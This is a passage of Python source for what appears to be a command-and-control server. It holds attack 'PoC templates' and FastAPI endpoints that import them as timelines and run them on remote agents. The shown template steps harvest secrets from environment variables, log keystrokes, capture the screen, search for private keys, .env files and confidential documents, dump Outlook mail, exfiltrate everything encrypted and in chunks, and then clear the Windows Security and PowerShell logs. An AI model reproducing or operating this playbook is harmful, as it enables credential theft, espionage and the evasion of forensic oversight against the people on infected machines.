            {"order": 23, "module": "builtin",        "action": "env_secrets",     "params": {"patterns": ["TOKEN","SECRET","PASSWORD","API_KEY","AWS","AZURE","GCP"]}, "delay": 2, "timeout": 20, "priority": "critical"},
            {"order": 24, "module": "keylog",         "action": "start",           "params": {"duration": 120, "flush_interval": 30},                        "delay": 5,  "timeout": 180, "priority": "high"},
            # Phase 5 — Exfiltration & Cover Tracks
            {"order": 25, "module": "screen_stream",  "action": "frame",           "params": {"quality": 85},                                                "delay": 5,  "timeout": 15,  "priority": "normal"},
            {"order": 26, "module": "screenshot",     "action": "capture",         "params": {"count": 10, "interval": 8},                                   "delay": 2,  "timeout": 120, "priority": "normal"},
            {"order": 27, "module": "file",           "action": "search",          "params": {"pattern": "*.pdf,*.docx,*.xlsx,*.pptx,.env,*.pem,id_rsa,*.db,*.sql,NDA*,Confidentiel*", "max": 500, "recursive": True}, "delay": 5, "timeout": 240, "priority": "critical"},
            {"order": 28, "module": "builtin",        "action": "outlook_emails",  "params": {"limit": 300, "folders": ["Inbox","Sent","Drafts"]},            "delay": 5,  "timeout": 180, "priority": "high"},
            {"order": 29, "module": "file",           "action": "exfil",           "params": {"compress": True, "encrypt": True, "chunk_size": 512000},       "delay": 10, "timeout": 600, "priority": "critical"},
            {"order": 30, "module": "builtin",        "action": "clear_logs",      "params": {"logs": ["Security","System","Application","PowerShell","WMI"]}, "delay": 5,  "timeout": 30,  "priority": "critical"},
        ],
    },
]


@router.get("/templates")
async def list_templates(current_user: CurrentUser) -> list[dict]:
    """Return all PoC templates from the library."""
    return [t.to_dict() for t in PocTemplate.select().order_by(PocTemplate.name)]


@router.post("/templates/{template_id}/import")
async def import_template(template_id: str, current_user: OperatorUser) -> dict:
    """Create a new Timeline from a PoC template."""
    tpl = PocTemplate.get_or_none(PocTemplate.puid == template_id)
    if not tpl:
        raise HTTPException(404, "Template not found")
    with database:
        tl = Timeline.create(
            name=tpl.name,
            description=tpl.description,
            agent_group=json.dumps(tpl.agent_group_list),
            steps=json.dumps(tpl.steps_list),
            trigger=tpl.trigger,
            loop=json.dumps(False),
            status="draft",
        )
    return tl.to_dict()


@pocs_router.get("")
async def list_pocs(current_user: CurrentUser) -> list[dict]:
    """Return all PoC templates from the library."""
    return [t.to_dict() for t in PocTemplate.select().order_by(PocTemplate.name)]


@pocs_router.get("/{poc_id}")
async def get_poc(poc_id: str, current_user: CurrentUser) -> dict:
    """Get a single PoC template by its stable id."""
    tpl = PocTemplate.get_or_none(PocTemplate.puid == poc_id)
    if not tpl:
        raise HTTPException(404, "PoC not found")
    return tpl.to_dict()


@pocs_router.post("/{poc_id}/import")
async def import_poc(poc_id: str, current_user: OperatorUser) -> dict:
    """Create a new Timeline from a PoC template."""
    tpl = PocTemplate.get_or_none(PocTemplate.puid == poc_id)
    if not tpl:
        raise HTTPException(404, "PoC not found")
    with database:
        tl = Timeline.create(
            name=tpl.name,
            description=tpl.description,
            agent_group=json.dumps(tpl.agent_group_list),
            steps=json.dumps(tpl.steps_list),
            trigger=tpl.trigger,
            loop=json.dumps(False),
            status="draft",
        )
    return tl.to_dict()


@router.get("")
async def list_timelines(current_user: CurrentUser) -> list[dict]:
    return [t.to_dict() for t in Timeline.select().order_by(Timeline.created_at.desc())]


@router.post("", status_code=201)
async def create_timeline(body: TimelineCreate, current_user: OperatorUser) -> dict:
    with database:
        tl = Timeline.create(
            name=body.name,
            description=body.description,
            agent_group=json.dumps(body.agent_group),
            steps=json.dumps([s.model_dump() for s in body.steps]),
            trigger=body.trigger,
            loop=json.dumps(body.loop),
            status=body.status,
        )
    return tl.to_dict()


@router.get("/{timeline_id}")
async def get_timeline(timeline_id: str, current_user: CurrentUser) -> dict:
    tl = Timeline.get_or_none(Timeline.id == timeline_id)
    if not tl:
        raise HTTPException(404, "Timeline not found")
    return tl.to_dict()


@router.get("/{timeline_id}/tasks")
async def get_timeline_tasks(timeline_id: str, current_user: CurrentUser) -> list[dict]:
    """Return all tasks belonging to a timeline, ordered by creation time."""
    from db.models import Task

    tl = Timeline.get_or_none(Timeline.id == timeline_id)
    if not tl:
        raise HTTPException(404, "Timeline not found")
    tasks = Task.select().where(Task.timeline_id == timeline_id).order_by(Task.created_at)
    return [t.to_dict() for t in tasks]


@router.put("/{timeline_id}")
async def update_timeline(timeline_id: str, body: TimelineUpdate, current_user: OperatorUser) -> dict:
    tl = Timeline.get_or_none(Timeline.id == timeline_id)
    if not tl:
        raise HTTPException(404, "Timeline not found")

    updates: dict = {}
    if body.name is not None:
        updates["name"] = body.name
    if body.description is not None:
        updates["description"] = body.description
    if body.agent_group is not None:
        updates["agent_group"] = json.dumps(body.agent_group)
    if body.steps is not None:
        updates["steps"] = json.dumps([s.model_dump() for s in body.steps])
    if body.trigger is not None:
        updates["trigger"] = body.trigger
    if body.loop is not None:
        updates["loop"] = json.dumps(body.loop)
    if body.status is not None:
        updates["status"] = body.status

    if updates:
        with database:
            Timeline.update(**updates).where(Timeline.id == timeline_id).execute()
        tl = Timeline.get_by_id(timeline_id)

    return tl.to_dict()


class ExecuteTimelineRequest(BaseModel):
    agent_ids: list[str] | None = None


@router.post("/{timeline_id}/execute")
async def execute_timeline(
    timeline_id: str,
    current_user: OperatorUser,
    body: ExecuteTimelineRequest | None = None,
) -> dict:
    agent_ids = body.agent_ids if body else None
    try:
        result = await orchestrator.execute(timeline_id, agent_ids=agent_ids)
    except ValueError as exc:
        raise HTTPException(400, str(exc))
    return result


@router.delete("/{timeline_id}", status_code=204)
async def delete_timeline(timeline_id: str, current_user: OperatorUser) -> None:
    tl = Timeline.get_or_none(Timeline.id == timeline_id)
    if not tl:
        raise HTTPException(404, "Timeline not found")
    orchestrator.cancel_loop(timeline_id)
    with database:
        Timeline.delete().where(Timeline.id == timeline_id).execute()
